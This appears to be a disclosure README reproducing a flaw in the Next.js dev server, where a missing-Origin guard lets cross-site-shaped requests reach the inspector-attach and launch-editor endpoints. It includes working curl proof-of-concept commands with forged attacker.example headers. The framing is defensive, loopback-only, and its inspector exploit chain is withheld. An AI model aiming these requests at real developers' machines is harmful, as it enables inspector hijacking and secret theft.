# next dev internal endpoints — minimal reproduction

Affected: `next@16.4.5` (npm `latest` at time of writing). Development server only.
`next start` and production are not affected.

Two internal endpoints are reachable in `next dev` with a request shaped like a top-level
cross-site navigation (no `Origin`):

- `GET /__nextjs_attach-nodejs-inspector` arms the Node inspector and returns a URL
  containing the inspector WebSocket id.
- `GET /__nextjs_launch-editor?file=<path>` opens an existing file in the developer's
  editor.

The shared dev guard checks only `Origin`/`Referer`. It never checks `Host`, and it treats
a missing `Origin` as same-site. A top-level cross-site navigation sends no `Origin`.

We did not demonstrate a real browser DNS-rebinding drive-by; that is a precondition, not
a proven step.

## No special setup

This reproduction uses the **default** editor path. There is no fake editor and no editor
environment variable. `next dev` detects the developer's running editor and opens the file
in it, exactly as it would in normal use.

Only two things are safety choices, not requirements:

| Item | Required? | Purpose |
|---|---|---|
| `--hostname 127.0.0.1` in the `dev` script | No | Keeps the demo on loopback |
| `Sec-Fetch-*` / `Referer` headers in `curl` | No | The browser sends these; curl stands in for it |

## Requirements

- Node `>=20.9.0` (tested on Node 24.11.1)
- Linux or macOS
- Ports `3000` (dev server) and `9229` (inspector) on loopback
- A running editor (VS Code, Vim, etc.) or `EDITOR`/`VISUAL` set

## Run

```sh
npm install
npm run dev
```

In a second terminal, run the checks one by one:

```sh
# 1. The attach endpoint discloses the inspector URL.
curl -s \
  'http://127.0.0.1:3000/__nextjs_attach-nodejs-inspector'

# 2. No Origin + navigate shape reaches launch-editor.
printf 'repro\n' > /tmp/repro-target.txt
curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'Sec-Fetch-Site: cross-site' -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Dest: document' -H 'Referer: https://attacker.example/' \
  'http://127.0.0.1:3000/__nextjs_launch-editor?file=/tmp/repro-target.txt&line1=1'

# 3. Control: an Origin-bearing request is blocked.
printf 'control\n' > /tmp/control-target.txt
curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'Origin: https://attacker.example' \
  'http://127.0.0.1:3000/__nextjs_launch-editor?file=/tmp/control-target.txt&line1=1'
```

Expected:

1. The attach request returns a `devtoolsFrontendUrl` that embeds `ws=127.0.0.1:9229/...`,
   even though the server was not started with `--inspect`.
2. The launch-editor request returns `204`, and **your own editor opens
   `/tmp/repro-target.txt`**.
3. The control request with `Origin: https://attacker.example` returns `403`, and
   `/tmp/control-target.txt` does not open.

The `204` only means the file exists. That your editor opened it is what proves the
spawn. No environment variable is involved.

## Inspector chain

The CDP proof is kept private and is not part of this repository. It does not use an
editor at all. Run it only from the private packet, on loopback. The optional impact
payload reads a dummy `.env.local` from this directory to show secret exposure; that file
is gitignored and must contain fake values only.

## Safety

Everything binds `127.0.0.1`. The curl reproduction writes only `/tmp/repro-target.txt`
and `/tmp/control-target.txt`; the private CDP proof writes `/tmp/pwned`. The optional
impact/Docker steps also create a dummy `.env.local` here with fake values only. No
network targets, no persistence.

## Redaction

Before publishing any output, replace the UUID (`ws=127.0.0.1:9229/...`) with `<uuid>`
and strip usernames, hostnames, and absolute paths.
